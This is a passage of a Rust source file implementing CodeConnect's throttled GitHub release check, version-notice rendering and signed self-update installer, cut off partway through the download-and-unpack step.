//! The "a newer CodeConnect exists" notice, and the machinery behind it.
//!
//! A user who runs `codeconnect claude` every day has no reason to think
//! about upgrading, so the launch tells them — under three rules that keep
//! the telling honest and the launch fast:
//!
//!   * **The launch path never touches the network.** The notice is read
//!     from a cache file; the cache is refreshed by a fully detached child
//!     spawned just before the attach, at most once per 24 hours. A slow or
//!     absent network costs the launch nothing.
//!   * **"Newer" means a published GitHub Release**, semantically greater
//!     than this binary's own version — never "a commit exists". The feature
//!     is deliberately dormant until the project starts cutting releases;
//!     the ship contract from then on is: bump the workspace version, tag
//!     that exact commit `vX.Y.Z`, publish the Release, versions strictly
//!     increasing, never retag.
//!   * **The tag is a trust boundary.** It comes from a third-party API
//!     response, so nothing from that response is compared or printed until
//!     it has survived a full-match semver validation; every other response
//!     field is discarded unread. An error — 404, rate limit, timeout,
//!     malformed JSON — is not evidence and produces silence, preserving
//!     whatever validated answer the cache already held.
//!
//! `update_check: false` in the config disables both the network attempt
//! and the cached notice. The daemon never phones home either way.

use std::path::PathBuf;

use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};

use crate::update_release::Archive;

/// Where the checker's answer lives between launches.
fn cache_path() -> PathBuf {
    protocol::root_dir().join("update-check.json")
}

/// The claim that makes the 24-hour throttle hold across processes — two
/// `codeconnect claude` launches in the same second must produce at most one
/// GitHub request. The atom is `flock(2)`, and the kernel is the whole
/// protocol: a lock dies with its holder, so there are no corpses to detect,
/// no birth-times to compare, and no takeover race between two would-be
/// breakers. A file-content lock needs all three, and each is its own race:
/// a created-then-written lock is momentarily empty and reads as a corpse,
/// and two breakers judging one corpse can each delete the other's fresh
/// claim. The lock file itself is permanent and contentless.
fn lock_path() -> PathBuf {
    protocol::root_dir().join(".update-check.lock")
}

const ATTEMPT_INTERVAL_SECS: u64 = 24 * 60 * 60;
/// A Releases response is a few hundred bytes of interest; a response bigger
/// than this is not one we read further.
const MAX_RESPONSE_BYTES: u64 = 64 * 1024;

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct UpdateCache {
    /// When the checker last *tried*, successful or not — the 24h throttle.
    #[serde(default)]
    pub last_attempt_unix: u64,
    /// The last validated answer to "what is the latest release", kept
    /// verbatim (`1.2.3`, no `v`). Mirrors the server: each validated fetch
    /// replaces it, whatever it says; only *failures* preserve the previous
    /// answer. The notice, not the cache, decides what counts as newer.
    #[serde(default)]
    pub latest: Option<String>,
}

// ---------------------------------------------------------------- versions

/// Parse a version or a release tag into its numeric triple.
///
/// Full-match and ASCII-only on purpose: this is the entire trust boundary
/// for a string a third party controls. An optional leading `v` is the one
/// tag convention accepted; anything else — whitespace, suffixes, control
/// characters, Unicode digits, a fourth component, leading zeroes — is not a
/// version, and "not a version" must never become "version zero".
pub fn parse_version(raw: &str) -> Option<(u64, u64, u64)> {
    let body = raw.strip_prefix('v').unwrap_or(raw);
    let mut parts = body.split('.');
    let (a, b, c) = (parts.next()?, parts.next()?, parts.next()?);
    if parts.next().is_some() {
        return None;
    }
    let component = |part: &str| -> Option<u64> {
        if part.is_empty() || !part.bytes().all(|b| b.is_ascii_digit()) {
            return None;
        }
        if part.len() > 1 && part.starts_with('0') {
            return None;
        }
        part.parse::<u64>().ok()
    };
    Some((component(a)?, component(b)?, component(c)?))
}

/// The version compiled into this binary. The `expect` is exercised by a
/// test, which is what makes it a release-gate rather than a hope: a
/// workspace version this parser refuses would fail CI before it failed a
/// user.
pub fn installed_version() -> (u64, u64, u64) {
    parse_version(env!("CARGO_PKG_VERSION")).expect("CARGO_PKG_VERSION is not a plain X.Y.Z semver")
}

/// Whether a release may be installed over the version that is running.
///
/// **Newer or the same, never older.** Every other check the updater makes
/// passes on an older release: it is a genuine, correctly signed, correctly
/// checksummed CodeConnect release. What `releases/latest` points at is
/// server-side state this program does not control — a release published by
/// hand, or by an account that was compromised, can make an older version
/// "latest" — and every machine would then be offered a downgrade as an
/// upgrade.
///
/// The same version is allowed through deliberately: that is the repair path
/// for a set where one binary is missing or does not match the others.
///
/// Text that cannot be read as a version is refused rather than ordered as
/// text, under which `0.10.0` precedes `0.9.0`.
pub fn may_install(candidate: &str, running: &str) -> Result<(), String> {
    let Some(offered) = parse_version(candidate) else {
        return Err(format!("`{candidate}` is not a version this can order"));
    };
    let Some(installed) = parse_version(running) else {
        return Err(format!(
            "the running binary calls itself `{running}`, which is not a version this can order"
        ));
    };
    if offered < installed {
        return Err(format!(
            "the latest release is {candidate}, which is older than the installed {running}. \
             Nothing was changed."
        ));
    }
    Ok(())
}

// ------------------------------------------------------------------ cache

/// Read the cache, revalidating the stored version — a cache written by
/// anything, including a future or corrupted build, gets the same trust
/// boundary as the network response.
pub fn read_cache() -> UpdateCache {
    read_cache_from(&cache_path())
}

fn read_cache_from(path: &std::path::Path) -> UpdateCache {
    let Ok(bytes) = std::fs::read(path) else {
        return UpdateCache::default();
    };
    let Ok(mut cache) = serde_json::from_slice::<UpdateCache>(&bytes) else {
        return UpdateCache::default();
    };
    if let Some(latest) = &cache.latest {
        if parse_version(latest).is_none() {
            cache.latest = None;
        }
    }
    cache
}

/// Atomic write: unique temp file beside the target, then rename, so an
/// interrupted write leaves the previous record readable rather than half a
/// JSON document.
fn write_cache_to(path: &std::path::Path, cache: &UpdateCache) -> Result<()> {
    let parent = path
        .parent()
        .context("the cache path has no parent directory")?;
    std::fs::create_dir_all(parent)?;
    let temp = parent.join(format!(".update-check.{}.tmp", std::process::id()));
    std::fs::write(&temp, serde_json::to_vec(cache)?)?;
    std::fs::rename(&temp, path)?;
    Ok(())
}

/// Holds the kernel lock for as long as it lives; dropping — or dying, in
/// any way — is what releases it. `flock` locks belong to the open file
/// description, and the kernel cleans up when that closes.
///
/// Never cloned, and neither is the `File`. An unlock names the description
/// rather than the descriptor, so two claims over one description would mean
/// whichever dropped first released the lock for both.
struct ThrottleClaim {
    file: std::fs::File,
}

/// **Not redundant with the `close` that follows it.** Closing frees the lock
/// only when the last reference to the description goes, and spawning a
/// process duplicates that reference into the child until the new image is
/// activated — so without this, the lock outlives the drop, held by a child
/// that has no idea it holds it. `flock(2)` is explicit that duplicated
/// descriptors are references to one lock, released by an unlock through any
/// of them; that is what makes dropping the release rather than a request for
/// one. Dying by a route that runs no destructor still releases at last
/// close, unchanged.
impl Drop for ThrottleClaim {
    fn drop(&mut self) {
        use std::os::fd::AsRawFd;
        // Nowhere for a failure to go, and nothing to do about one: the
        // close immediately after is the same release this pre-empts.
        unsafe { libc::flock(self.file.as_raw_fd(), libc::LOCK_UN) };
    }
}

fn claim_throttle_at(path: &std::path::Path) -> Option<ThrottleClaim> {
    if let Some(parent) = path.parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    let file = std::fs::OpenOptions::new()
        .write(true)
        .create(true)
        .truncate(false)
        .open(path)
        .ok()?;
    use std::os::fd::AsRawFd;
    // Non-blocking exclusive: the loser leaves rather than queues — a
    // second simultaneous launch has nothing to wait for, the winner is
    // already doing the day's one check.
    let rc = unsafe { libc::flock(file.as_raw_fd(), libc::LOCK_EX | libc::LOCK_NB) };
    if rc != 0 {
        return None;
    }
    Some(ThrottleClaim { file })
}

/// Whether the 24-hour throttle permits an attempt now. A future
/// `last_attempt` is a clock that moved backwards; treating it as "recently
/// attempted" would silence the checker for however far forward the clock
/// had wandered, so it reads as due.
pub fn attempt_due(cache: &UpdateCache, now_unix: u64) -> bool {
    cache.last_attempt_unix > now_unix
        || now_unix - cache.last_attempt_unix >= ATTEMPT_INTERVAL_SECS
}

// ----------------------------------------------------------------- notice

/// The fact an update surface renders: what is installed, what exists.
/// Semantic on purpose — the pre-attach slot and `daemon status` style for
/// different streams, so the *data* is shared and the rendering is not.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct UpdateAdvisory {
    pub installed: (u64, u64, u64),
    pub latest: String,
}

/// The advisory, or `None` while this binary is current (or nothing
/// validated is known). Pure, so the comparison is pinned.
pub fn update_advisory(cache: &UpdateCache, installed: (u64, u64, u64)) -> Option<UpdateAdvisory> {
    let latest_raw = cache.latest.as_deref()?;
    let latest = parse_version(latest_raw)?;
    if latest <= installed {
        return None;
    }
    Some(UpdateAdvisory {
        installed,
        latest: latest_raw.to_string(),
    })
}

/// The advisory for the current install, from the cache on disk.
pub fn cached_advisory() -> Option<UpdateAdvisory> {
    update_advisory(&read_cache(), installed_version())
}

// -------------------------------------------------------- update advisory

/// The one advisory a launch can carry: a newer release exists. Rendered here
/// so the caller has a single thing to print or not print.
pub fn select_update_note(release: Option<UpdateAdvisory>, style: Style) -> Option<String> {
    release.map(|advisory| render_update(&advisory, style))
}

/// stdout, and each answers for its own.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Style {
    /// A TTY that took no styling opt-outs: SGR bold plus typographic
    /// unicode.
    Styled,
    /// A TTY under `NO_COLOR`: the convention disables SGR — all of it,
    /// bold included — but says nothing about characters, so the
    /// typography stays.
    PlainUnicode,
    /// Not a TTY, or `TERM=dumb`: pure ASCII, no escapes, fit for logs and
    /// pipes.
    Ascii,
}

/// The one styling decision, from the three documented signals. `NO_COLOR`
/// counts when *present*, even empty — that is the convention's own rule.
pub fn style_for(is_tty: bool, term: Option<&str>, no_color_present: bool) -> Style {
    if !is_tty || term == Some("dumb") {
        return Style::Ascii;
    }
    if no_color_present {
        return Style::PlainUnicode;
    }
    Style::Styled
}

/// `style_for`, fed from an environment lookup — injected, so the adapter
/// itself is testable without mutating the process environment (a race
/// against every parallel test). Production passes the real environment.
pub fn style_from_env(is_tty: bool, env: impl Fn(&str) -> Option<std::ffi::OsString>) -> Style {
    let term = env("TERM").map(|value| value.to_string_lossy().into_owned());
    style_for(is_tty, term.as_deref(), env("NO_COLOR").is_some())
}

/// The production adapter: the real environment for a given stream.
pub fn style_for_stream(is_tty: bool) -> Style {
    style_from_env(is_tty, |name| std::env::var_os(name))
}

const BOLD: &str = "\u{1b}[1m";
const RESET: &str = "\u{1b}[0m";

/// The `daemon status` block for the advisory: rendered for *stdout*'s own
/// styling signals, and by construction free of any countdown — status is a
/// listing, not a doorway, and it never holds anyone.
pub fn status_update_block(
    advisory: &UpdateAdvisory,
    stdout_is_tty: bool,
    term: Option<&str>,
    no_color_present: bool,
) -> String {
    render_update(advisory, style_for(stdout_is_tty, term, no_color_present))
}

/// Render the update advisory for one stream.
///
/// The block is margin-free and label-free: a fact line, a blank line, and
/// the command alone — nothing for the eye to climb over. Bold is the only
/// emphasis; an available update is news, not a warning, so no colour.
pub fn render_update(advisory: &UpdateAdvisory, style: Style) -> String {
    let (a, b, c) = advisory.installed;
    let latest = &advisory.latest;
    match style {
        Style::Styled => format!(
            "{BOLD}CodeConnect update available{RESET} \u{b7} {a}.{b}.{c} \u{2192} {latest}\n\n\
             {BOLD}codeconnect update{RESET}"
        ),
        Style::PlainUnicode => format!(
            "CodeConnect update available \u{b7} {a}.{b}.{c} \u{2192} {latest}\n\n\
             codeconnect update"
        ),
        Style::Ascii => {
            format!("CodeConnect update available: {a}.{b}.{c} -> {latest}\n\ncodeconnect update")
        }
    }
}

// ---------------------------------------------------------------- checker

/// Spawn the detached checker if the throttle permits. Fire-and-forget: null
/// stdio, its own process group, never waited on — the attach that follows
/// replaces this process, and the child must outlive it without owning the
/// terminal.
pub fn spawn_checker_if_due() {
    if !attempt_due(&read_cache(), unix_now()) {
        return;
    }
    let Ok(current) = std::env::current_exe() else {
        return;
    };
    use std::os::unix::process::CommandExt;
    let _ = std::process::Command::new(current)
        .arg("__update-check")
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .process_group(0)
        .spawn();
}

/// The hidden child: ask GitHub for the latest release and update the cache.
///
/// Every failure path still advances `last_attempt` — a flaky network must
/// throttle like a healthy one — and preserves the previously validated
/// `latest`. Config is consulted here too, so a child spawned an instant
/// before the operator wrote `update_check: false` still obeys it.
pub fn run_checker() -> Result<()> {
    if !protocol::config::Config::load().update_check {
        return Ok(());
    }
    run_checker_with(
        &cache_path(),
        &lock_path(),
        unix_now(),
        fetch_latest_release_tag,
    )
}

/// The checker's whole discipline, fetch injected so a test can prove the
/// ordering without a network:
///
///   1. take the cross-process lock, or leave — two simultaneous launches
///      spawn two children, and at most one may go to GitHub;
///   2. re-check the throttle *under* the lock — the parent's check was
///      against a cache another child may have advanced since;
///   3. claim the attempt (persist `last_attempt`) **before** fetching, so a
///      child that dies mid-fetch still throttled — a crashing checker must
///      not retry every launch;
///   4. fetch, and only a validated answer replaces `latest`.
fn run_checker_with(
    cache_file: &std::path::Path,
    lock_file: &std::path::Path,
    now_unix: u64,
    fetch: impl FnOnce() -> Option<String>,
) -> Result<()> {
    let Some(_claim) = claim_throttle_at(lock_file) else {
        return Ok(());
    };
    let mut cache = read_cache_from(cache_file);
    if !attempt_due(&cache, now_unix) {
        return Ok(());
    }
    cache.last_attempt_unix = now_unix;
    write_cache_to(cache_file, &cache)?;
    if let Some(tag) = fetch() {
        // Normalized without the `v`, so the cache holds exactly what the
        // notice prints.
        let normalized = tag.strip_prefix('v').unwrap_or(&tag).to_string();
        cache.latest = Some(normalized);
        write_cache_to(cache_file, &cache)?;
    }
    Ok(())
}

/// The latest published release's tag, if the network, the API and the
/// validation all cooperate. `None` is silence, never evidence.
fn fetch_latest_release_tag() -> Option<String> {
    let output = std::process::Command::new("/usr/bin/curl")
        .args([
            // First, always: without it curl reads ~/.curlrc, which can add
            // URLs, redirect output or attach headers — and the README's
            // promise is one documented request, not one plus whatever a
            // dotfile says.
            "-q",
            "-fsS",
            "--max-time",
            "5",
            "--max-filesize",
            "65536",
            "-H",
            "Accept: application/vnd.github+json",
            // The only GitHub request CodeConnect makes on its own —
            // documented in the README's privacy note and disabled by
            // `update_check: false`. (`codeconnect update` also talks to
            // GitHub, but only ever when the user types it; the daemon's
            // APNs pushes are the other autonomous traffic, to Apple.)
            // GitHub's "latest" is the newest published non-draft,
            // non-prerelease Release.
            "https://api.github.com/repos/faisalmumtaz89/CodeConnect/releases/latest",
        ])
        .stdin(std::process::Stdio::null())
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    parse_release_tag(&output.stdout)
}

/// Extract and validate `tag_name` — the only field this feature is allowed
/// to read. The deserialization target *has* no other fields, so the rest of
/// the response is skipped by the parser rather than materialized and then
/// ignored: untrusted text never exists in memory as anything but the bytes
/// it arrived in.
pub fn parse_release_tag(body: &[u8]) -> Option<String> {
    #[derive(serde::Deserialize)]
    struct LatestRelease {
        tag_name: String,
    }
    let capped = &body[..body.len().min(MAX_RESPONSE_BYTES as usize)];
    let release = serde_json::from_slice::<LatestRelease>(capped).ok()?;
    parse_version(&release.tag_name)?;
    Some(release.tag_name)
}

// ------------------------------------------------------------------- hold

/// One countdown frame: carriage return, erase-line, the sentence. The
/// cursor controls are not SGR, so `NO_COLOR` does not touch them.
pub fn countdown_frame(seconds_left: u64) -> String {
    format!("\r\u{1b}[2KContinuing in {seconds_left}s\u{2026} Press Return to continue now.")
}

/// The erase that removes the countdown before the attach takes the screen.
pub const COUNTDOWN_CLEAR: &str = "\r\u{1b}[2K";

/// Hold the terminal for reading, honestly: a countdown, because nothing is
/// working — the session already exists, and the pause exists for the
/// reader. `10` shows immediately; frames follow *elapsed monotonic time*
/// (a delayed tick shows the true remainder, never replays missed numbers);
/// `0` is never shown; Return — or stdin closing — ends the hold at once.
/// `skip(wait)` waits up to `wait` and says whether the reader asked to go on.
pub fn hold_for_reading(
    total: std::time::Duration,
    mut skip: impl FnMut(std::time::Duration) -> bool,
    out: &mut dyn std::io::Write,
    mut now: impl FnMut() -> std::time::Instant,
) {
    let start = now();
    let mut last_shown: Option<u64> = None;
    loop {
        let elapsed = now().saturating_duration_since(start);
        if elapsed >= total {
            break;
        }
        let remainder = total - elapsed;
        let left = (remainder.as_secs_f64().ceil() as u64).max(1);
        // A timer that wakes a millisecond shy of the boundary recomputes
        // the same number; re-emitting it would double a frame. The number
        // is the frame's identity — an unchanged number writes nothing.
        if last_shown != Some(left) {
            last_shown = Some(left);
            let _ = write!(out, "{}", countdown_frame(left));
            let _ = out.flush();
        }
        // Sleep until the displayed number is due to change — remainder
        // minus the whole seconds the current frame still covers — never a
        // fixed distance to a boundary the wake-up jitter can straddle.
        let until_change =
            remainder.saturating_sub(std::time::Duration::from_secs(left.saturating_sub(1)));
        let wait = until_change.max(std::time::Duration::from_millis(1));
        if skip(wait) {
            break;
        }
    }
    let _ = write!(out, "{COUNTDOWN_CLEAR}");
    let _ = out.flush();
}

/// Whether Return was pressed on `fd` — or it closed — within `wait`.
///
/// Waited for here, on the caller's thread, and never by a reader left behind:
/// the attach that follows the hold reads the same terminal in raw mode, and a
/// reader still parked on it would take the terminal's answers and the user's
/// keys. A terminal in canonical mode is readable only once a whole line or EOF
/// is there, so readiness is the Return. Only a lone Return — the answer to
/// "Press Return to continue now" — or EOF is taken: a typed line is the user's
/// input to the agent, and stays for the attach to pass on.
pub fn returned_within(fd: std::os::fd::RawFd, wait: std::time::Duration) -> bool {
    let mut poll = libc::pollfd {
        fd,
        events: libc::POLLIN,
        revents: 0,
    };
    let millis = wait.as_millis().min(i32::MAX as u128) as i32;
    if unsafe { libc::poll(&mut poll, 1, millis) } <= 0 {
        return false;
    }
    let mut pending: libc::c_int = 0;
    unsafe { libc::ioctl(fd, libc::FIONREAD, &mut pending) };
    if pending <= 1 {
        let mut byte = [0u8; 1];
        unsafe { libc::read(fd, byte.as_mut_ptr().cast(), byte.len()) };
    }
    true
}

// ----------------------------------------------------------------- update

/// The lock one `codeconnect update` holds against another.
///
/// **A different lock from the advisory's**, deliberately. That one throttles a
/// background check nobody asked for and is fine to lose; this one guards a
/// directory exchange, and two of those interleaving could stage against each
/// other's `bin.incoming` and exchange the wrong set into place.
///
/// The same `flock(2)` reasoning applies: the kernel releases it when the
/// holder dies, however it dies, so there is no corpse to detect and no
/// takeover race to lose.
fn update_lock_path(root: &std::path::Path) -> PathBuf {
    root.join(".update.lock")
}

/// The operations that reach outside the updater's own process: the network,
/// the signature judgment, running a binary, launchd.
///
/// Everything else the updater does — checksum arithmetic, archive judgment,
/// Mach-O reading, staging, the exchange — is its own code and runs for real
/// everywhere, tests included. These six are the seams a test injects,
/// because a test can neither reach GitHub nor produce a Developer ID
/// signature; injecting a permissive judge there proves the *sequence* around
/// the judgment, never the judgment itself, which has its own tests.
pub struct UpdateDeps<'a> {
    /// The release this run installs from: `releases/latest` for an update,
    /// this binary's own release for the tmux it needs.
    pub fetch_release: &'a dyn Fn() -> Result<Vec<u8>>,
    /// Fetch one asset URL into a file, within a byte ceiling.
    pub download: &'a dyn Fn(&str, &std::path::Path, u64) -> Result<()>,
    /// The Developer ID judgment on one file.
    pub verify_signature: &'a dyn Fn(&std::path::Path) -> Result<()>,
    /// Run a binary and return its `--version` line.
    pub probe_version: &'a dyn Fn(&std::path::Path) -> Result<String>,
    /// Run a binary with one argument and return what it printed: `-V` of
    /// `cc-tmux`, `--tmux-version` of `codeconnect`.
    pub ask: &'a dyn Fn(&std::path::Path, &str) -> Result<String>,
    /// Restart the managed daemon; `false` means none is loaded.
    pub restart_daemon: &'a dyn Fn() -> Result<bool>,
}

/// `codeconnect update`: install the latest published release.
///
/// **One way to update, whatever built the binary that is running.** It fetches
/// the newest release, proves it is CodeConnect's, and replaces all three
/// binaries together. It does not look for a checkout, does not build, and
/// needs no toolchain on the machine.
///
/// Every step that could accept the wrong bytes refuses instead, and refuses
/// before anything on disk moves:
///
///   * the two assets are read out of the release that named the version, not
///     guessed from a `latest/download` URL that resolves later;
///   * the checksum catches a truncated download;
///   * the **signature** is the check that matters — pinned to CodeConnect's
///     Apple team, so a correctly signed binary from anybody else is refused;
///   * each binary is asked its own version, so a correctly signed *older*
///     release cannot be served in place of the newest one.
///
/// The install itself is one directory exchange, so a machine that loses power
/// mid-update comes back with the complete old set or the complete new one.
pub fn run_update() -> Result<()> {
    let deps = UpdateDeps {
        fetch_release: &fetch_latest_release,
        download: &crate::update_install::download,
        verify_signature: &crate::update_install::verify_signature,
        probe_version: &crate::update_install::version_of,
        ask: &crate::update_install::answer_of,
        restart_daemon: &crate::launchd::restart_managed_daemon,
    };
    run_update_at(&protocol::root_dir(), &deps)
}

fn run_update_at(root: &std::path::Path, deps: &UpdateDeps) -> Result<()> {
    let live = root.join("bin");
    let _only_one = claim_throttle_at(&update_lock_path(root)).ok_or_else(|| {
        anyhow::anyhow!(
            "another codeconnect update or installation is already running; nothing was changed"
        )
    })?;
    // Under the lock, before anything is read or staged: an interrupted run
    // leaves a complete live set and a stale staging directory, and the next
    // update must not build on top of it.
    crate::update_install::clear_leftovers(root)?;
    let installed = installed_version();
    let installed_text = format!("{}.{}.{}", installed.0, installed.1, installed.2);

    let body = (deps.fetch_release)()?;
    let tag = parse_release_tag(&body)
        .ok_or_else(|| anyhow::anyhow!("the latest release does not name a version"))?;
    let latest_text = tag.trim_start_matches('v').to_string();

    // Before the currentness check, because a downgrade is *also* "not
    // current": read the other way round, an older release served as the latest
    // one looks exactly like an update that is due. See `may_install`.
    may_install(&latest_text, &installed_text).map_err(|why| anyhow::anyhow!("{why}"))?;

    // Asked of all three installed binaries, not of the one running: a skewed
    // install — `ccd` a release behind the shim — is exactly what a check on
    // the running binary blesses and then cannot repair. A binary that cannot
    // be asked reads as absent, which reads as not current.
    let set: Vec<(String, Option<String>)> = crate::update_release::SHIPPED_BINARIES
        .iter()
        .map(|binary| {
            let said = (deps.probe_version)(&live.join(binary)).ok();
            (binary.to_string(), said)
        })
        .collect();
    if crate::update_install::set_is_current(&set, &latest_text) {
        if tmux_is_installed(&live, deps) {
            println!("codeconnect {latest_text} is the latest release. Nothing to do.");
            return Ok(());
        }
        // The binaries are current and only tmux is missing or wrong: an older
        // updater installed this release without it, or it was removed.
        // Repaired from this same release, without touching the binaries.
        println!(
            "CodeConnect's tmux is missing or not the one {latest_text} ships; reinstalling it."
        );
        return with_work_dir(root, |work| {
            let required = (deps.ask)(&live.join("codeconnect"), "--tmux-version")?;
            install_tmux(&body, &latest_text, &required, work, &live, root, deps)
        });
    }
    if latest_text == installed_text && !set.is_empty() {
        for (binary, said) in &set {
            match said {
                Some(said) => println!("  {binary}: {said}"),
                None => println!("  {binary}: not installed"),
            }
        }
        println!("reinstalling {latest_text} so all three match.");
    }

    let select = |archive| {
        crate::update_release::select_assets(&body, &latest_text, archive).map_err(|why| {
            anyhow::anyhow!(
                "codeconnect {installed_text} is installed and {latest_text} is the latest \
                 release, but it cannot be installed automatically: {why}. Nothing was changed."
            )
        })
    };
    let core = select(Archive::Core)?;
    let tmux = select(Archive::Tmux)?;

    println!("codeconnect {installed_text} installed; fetching {latest_text}\u{2026}");

    with_work_dir(root, |work| {
        install_release(&core, &tmux, &latest_text, work, &live, root, deps)
    })?;

    println!("codeconnect {latest_text} installed.");
    Ok(())
}

/// How long a session start or an installer waits for another installation
/// to finish: longer than a slow download takes, shorter than anyone would
/// wait at a terminal without being told why.
const INSTALL_PATIENCE: std::time::Duration = std::time::Duration::from_secs(120);

/// Before a session is created: install CodeConnect's own tmux beside this
/// binary if it is not there, from this binary's own release.
///
/// An updater from before tmux shipped installs a release's binaries and
/// ignores its tmux, so the first session after that update is where the
/// gap shows. It is fetched once, announced, and needs no terminal. When it
/// cannot be fetched the session still starts on a system tmux if there is
/// one; with none, the session cannot start, and the error says what to run.
pub fn ensure_tmux() -> Result<()> {
    let root = protocol::root_dir();
    let live = root.join("bin");
    let Ok(exe) = std::env::current_exe() else {
        return Ok(());
    };
    if !bootstrap_applies(std::env::var_os("CODECONNECT_TMUX").is_some(), &exe, &live) {
        return Ok(());
    }
    // A build from source installed here is not the `codeconnect` any release
    // shipped, so there is no release tmux that belongs to it; it runs on the
    // system's, as it always has.
    if crate::update_install::verify_signature(&exe).is_err() {
        return Ok(());
    }

    eprintln!("Fetching CodeConnect's tmux\u{2026}");
    let deps = UpdateDeps {
        fetch_release: &fetch_own_release,
        download: &crate::update_install::download,
        verify_signature: &crate::update_install::verify_signature,
        probe_version: &crate::update_install::version_of,
        ask: &crate::update_install::answer_of,
        restart_daemon: &|| Ok(false),
    };
    let Err(why) = ensure_tmux_at(&root, env!("CARGO_PKG_VERSION"), &deps) else {
        return Ok(());
    };
    match protocol::tmux::tmux_bin() {
        Some(system) => {
            eprintln!("CodeConnect's tmux could not be installed: {why:#}");
            eprintln!(
                "using {} for now; `codeconnect update` installs it.",
                system.display()
            );
            Ok(())
        }
        None => anyhow::bail!(
            "CodeConnect's tmux could not be installed, and this Mac has no other tmux: \
             {why:#}. Run `codeconnect update` once this is resolved."
        ),
    }
}

/// Whether a session start should install CodeConnect's tmux: no tmux was
/// named explicitly, this binary is the installed one (through any symlink
/// to it), and `cc-tmux` is not beside it.
fn bootstrap_applies(explicit_tmux: bool, exe: &std::path::Path, live: &std::path::Path) -> bool {
    if explicit_tmux {
        return false;
    }
    let (Ok(exe), Ok(live)) = (exe.canonicalize(), live.canonicalize()) else {
        return false;
    };
    exe.parent() == Some(live.as_path()) && !live.join(crate::update_release::TMUX_BINARY).exists()
}

/// The installation half of [`ensure_tmux`], under the update lock.
fn ensure_tmux_at(root: &std::path::Path, version: &str, deps: &UpdateDeps) -> Result<()> {
    let live = root.join("bin");
    let _only_one = wait_for_update_lock(root)?;
    if live.join(crate::update_release::TMUX_BINARY).exists() {
        return Ok(());
    }
    crate::update_install::clear_leftovers(root)?;

    let body = own_release(version, deps)?;
    let required = (deps.ask)(&live.join("codeconnect"), "--tmux-version")?;
    with_work_dir(root, |work| {
        install_tmux(&body, version, &required, work, &live, root, deps)
    })
}

/// `codeconnect install-staged <dir>`: install the release binaries the
/// website installer downloaded and verified into `<dir>`, with their tmux,
/// exactly as `codeconnect update` installs a release. Run as the staged
/// `codeconnect` itself, so the version being installed is the one running.
pub fn run_install_staged(args: &[String]) -> Result<()> {
    let [from] = args else {
        anyhow::bail!("usage: codeconnect install-staged <directory>");
    };
    let deps = UpdateDeps {
        fetch_release: &fetch_own_release,
        download: &crate::update_install::download,
        verify_signature: &crate::update_install::verify_signature,
        probe_version: &crate::update_install::version_of,
        ask: &crate::update_install::answer_of,
        restart_daemon: &crate::launchd::restart_managed_daemon,
    };
    install_staged_at(
        &protocol::root_dir(),
        std::path::Path::new(from),
        env!("CARGO_PKG_VERSION"),
        &deps,
    )
}

fn install_staged_at(
    root: &std::path::Path,
    from: &std::path::Path,
    version: &str,
    deps: &UpdateDeps,
) -> Result<()> {
    std::fs::create_dir_all(root).context("creating the CodeConnect directory")?;
    let _only_one = wait_for_update_lock(root)?;
    crate::update_install::clear_leftovers(root)?;

    let body = own_release(version, deps)?;
    let tmux =
        crate::update_release::select_assets(&body, version, Archive::Tmux).map_err(|why| {
            anyhow::anyhow!("release {version} cannot be installed: {why}. Nothing was changed.")
        })?;
    with_work_dir(root, |work| {
        install_set(from, &tmux, version, work, &root.join("bin"), root, deps)
    })?;
    Ok(())
}

/// The update lock, waited for rather than refused: two sessions started
/// together on a machine without tmux should both start, an installation
/// already running may install what this one came for, and an installer run
/// beside either should finish after it rather than fail.
fn wait_for_update_lock(root: &std::path::Path) -> Result<ThrottleClaim> {
    let started = std::time::Instant::now();
    loop {
        if let Some(claim) = claim_throttle_at(&update_lock_path(root)) {
            return Ok(claim);
        }
        if started.elapsed() > INSTALL_PATIENCE {
            anyhow::bail!("another codeconnect installation is still running");
        }
        std::thread::sleep(std::time::Duration::from_millis(250));
    }
}

/// The listing of release `version` — the one this binary belongs to —
/// refused if GitHub answers for any other.
fn own_release(version: &str, deps: &UpdateDeps) -> Result<Vec<u8>> {
    let body = (deps.fetch_release)()?;
    let tag = parse_release_tag(&body)
        .ok_or_else(|| anyhow::anyhow!("the release does not name a version"))?;
    if tag.trim_start_matches('v') != version {
        anyhow::bail!("asked for release {version}, and GitHub answered with {tag}");
    }
    Ok(body)
}

/// Run one installation in a fresh `update.work`, and remove it afterwards.
fn with_work_dir(
    root: &std::path::Path,
    install: impl FnOnce(&std::path::Path) -> Result<()>,
) -> Result<()> {
    // `clear_leftovers` already removed this, and did so fail-closed.
    let work = root.join("update.work");
    std::fs::create_dir_all(&work).context("creating the update work directory")?;
    let outcome = install(&work);
    // Said rather than swallowed. It holds only the download and the unpacked
    // copy — nothing that can be installed from — so it does not turn a
    // successful update into a failed one, but a directory that cannot be
    // removed is something the next run will refuse on, and the reason belongs
    // where it happened.
    if let Err(why) = crate::update_install::remove_tree(&work) {
        eprintln!("the update work directory could not be removed: {why:#}");
    }
    outcome
}

/// Whether the installed `cc-tmux` is CodeConnect's, both architectures, and
/// the build the installed `codeconnect` requires. Anything that cannot be
/// established reads as not installed, so it is repaired rather than blessed.
fn tmux_is_installed(live: &std::path::Path, deps: &UpdateDeps) -> bool {
    let tmux = live.join(crate::update_release::TMUX_BINARY);
    let Ok(required) = (deps.ask)(&live.join("codeconnect"), "--tmux-version") else {
        return false;
    };
    (deps.verify_signature)(&tmux).is_ok()
        && crate::update_install::is_universal(&tmux).is_ok()
        && (deps.ask)(&tmux, "-V").is_ok_and(|said| said == required)
}

/// Download one archive, prove it intact and well formed, and unpack it.
/// Returns the directory holding its files.
fn fetch_and_unpack(
    assets: &crate::update_release::ReleaseAssets,
    version: &str,
    archive: Archive,
    work: &std::path::Path,
    deps: &UpdateDeps,
) -> Result<std::path::PathBuf> {
    use crate::update_install as install;

    let downloaded = work.join(&assets.archive.name);
    (deps.download)(
        &assets.archive.url,
        &downloaded,
        crate::update_release::MAX_ARCHIVE_BYTES,
    )?;
    let checksum_file = work.join(&assets.checksum.name);
    (deps.download)(&assets.checksum.url, &checksum_file, 4096)?;

    let expected = crate::update_release::parse_checksum(
        &std::fs::read_to_string(&checksum_file).context("reading the checksum file")?,
